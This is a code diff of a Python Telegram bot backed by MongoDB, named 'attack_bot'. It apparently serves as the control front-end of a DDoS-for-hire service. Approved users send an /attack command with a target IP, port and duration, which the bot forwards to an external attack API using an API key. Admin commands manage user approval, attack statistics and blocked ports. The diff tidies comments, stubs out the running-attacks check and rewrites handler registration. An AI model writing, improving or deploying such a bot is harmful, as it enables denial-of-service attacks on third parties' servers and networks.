@@ -33,7 +33,6 @@ def parse_admin_ids(env_value: str, default: str = "8210011971") -> list:
     if not env_value or env_value.strip() == "":
         env_value = default
     env_value = env_value.strip()
-    # Remove surrounding quotes
     if (env_value.startswith('"') and env_value.endswith('"')) or (env_value.startswith("'") and env_value.endswith("'")):
         env_value = env_value[1:-1]
     ids = []
@@ -49,11 +48,10 @@ def parse_admin_ids(env_value: str, default: str = "8210011971") -> list:
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGODB_URI = os.getenv("MONGODB_URI")
 DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
-API_URL = os.getenv("API_URL")          # Full base or endpoint? We'll use as is.
+API_URL = os.getenv("API_URL")
 API_KEY = os.getenv("API_KEY")
 ADMIN_IDS = parse_admin_ids(os.getenv("ADMIN_IDS", ""), "8210011971")
 
-# Check required vars
 missing = []
 if not BOT_TOKEN:
     missing.append("BOT_TOKEN")
@@ -67,7 +65,6 @@ if missing:
     print(f"❌ Missing env vars: {', '.join(missing)}")
     sys.exit(1)
 
-# If API_URL doesn't start with http, add https://
 if not API_URL.startswith(("http://", "https://")):
     API_URL = "https://" + API_URL
 
@@ -94,13 +91,11 @@ class Database:
         self.db = self.client[DATABASE_NAME]
         self.users = self.db.users
         self.attacks = self.db.attacks
-        # Cleanup
         try:
             self.users.delete_many({"user_id": None})
             self.users.delete_many({"user_id": {"$exists": False}})
         except:
             pass
-        # Indexes
         self.attacks.create_index([("timestamp", DESCENDING)])
         self.attacks.create_index([("user_id", ASCENDING)])
         self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
@@ -215,17 +210,11 @@ async def is_user_approved(user_id: int) -> bool:
         return False
     return True
 
-# ---------- API FUNCTIONS (direct use of API_URL) ----------
+# ---------- API FUNCTIONS ----------
 def launch_attack(ip: str, port: int, duration: int) -> Dict:
-    """Send attack request to the exact API_URL provided."""
     try:
-        # If API_URL already contains query parameters, use as is; else build.
-        # We assume the API expects JSON or query params. We'll try POST with JSON.
-        # If the endpoint is full URL with path, we still POST to it.
         headers = {"x-api-key": API_KEY, "Content-Type": "application/json"}
         payload = {"ip": ip, "port": port, "duration": duration}
-        # If API_URL looks like it expects GET parameters, we can adapt.
-        # For simplicity, we send POST.
         response = requests.post(API_URL, json=payload, headers=headers, timeout=15)
         if response.status_code == 200:
             return response.json()
@@ -237,7 +226,6 @@ def launch_attack(ip: str, port: int, duration: int) -> Dict:
 
 def check_api_health() -> Dict:
     try:
-        # Health check: try GET on the same API_URL (maybe it responds)
         headers = {"x-api-key": API_KEY}
         response = requests.get(API_URL, headers=headers, timeout=10)
         if response.status_code == 200:
@@ -248,14 +236,8 @@ def check_api_health() -> Dict:
         return {"status": "error", "error": str(e)}
 
 def check_running_attacks() -> Dict:
-    # Some APIs have /active endpoint; if not, we return dummy
-    # To avoid breaking, we return empty active list.
-    try:
-        # Try to construct an active endpoint from base? Not reliable.
-        # For now, return success with empty list.
-        return {"success": True, "activeAttacks": [], "count": 0, "maxConcurrent": 5}
-    except:
-        return {"success": True, "activeAttacks": []}
+    # Dummy implementation - replace if API provides
+    return {"success": True, "activeAttacks": [], "count": 0, "maxConcurrent": 5}
 
 # ---------- COMMAND HANDLERS ----------
 @admin_required
@@ -336,7 +318,8 @@ async def stats_command(update, context):
     await update.message.reply_text(text)
 
 @admin_required
-async def blocked_ports_command(update, context):
+async def blockedports_command(update, context):
+    """Admin command to show blocked ports - renamed to match pattern"""
     await update.message.reply_text(f"🚫 Blocked ports: {get_blocked_ports_list()}")
 
 # User commands
@@ -465,13 +448,32 @@ def main():
         sys.exit(1)
     app = Application.builder().token(BOT_TOKEN).build()
     
-    # Admin commands
-    for cmd in ["approve","disapprove","status","running","users","stats","blockedports"]:
-        app.add_handler(CommandHandler(cmd, globals()[f"{cmd}_command"]))
+    # Admin commands (use exact function names)
+    admin_handlers = [
+        ("approve", approve_command),
+        ("disapprove", disapprove_command),
+        ("status", status_command),
+        ("running", running_command),
+        ("users", users_command),
+        ("stats", stats_command),
+        ("blockedports", blockedports_command),   # renamed to match
+    ]
+    for cmd, func in admin_handlers:
+        app.add_handler(CommandHandler(cmd, func))
+    
     # User commands
-    for cmd in ["start","help","attack","myattacks","myinfo","mystats"]:
-        app.add_handler(CommandHandler(cmd, globals()[f"{cmd}_command"]))
-    app.add_handler(CommandHandler("blockedports", blocked_ports_user_command))
+    user_handlers = [
+        ("start", start_command),
+        ("help", help_command),
+        ("attack", attack_command),
+        ("myattacks", myattacks_command),
+        ("myinfo", myinfo_command),
+        ("mystats", mystats_command),
+        ("blockedports", blocked_ports_user_command),
+    ]
+    for cmd, func in user_handlers:
+        app.add_handler(CommandHandler(cmd, func))
+    
     app.add_error_handler(error_handler)
     
     print("🤖 Bot started. Admins:", ADMIN_IDS)
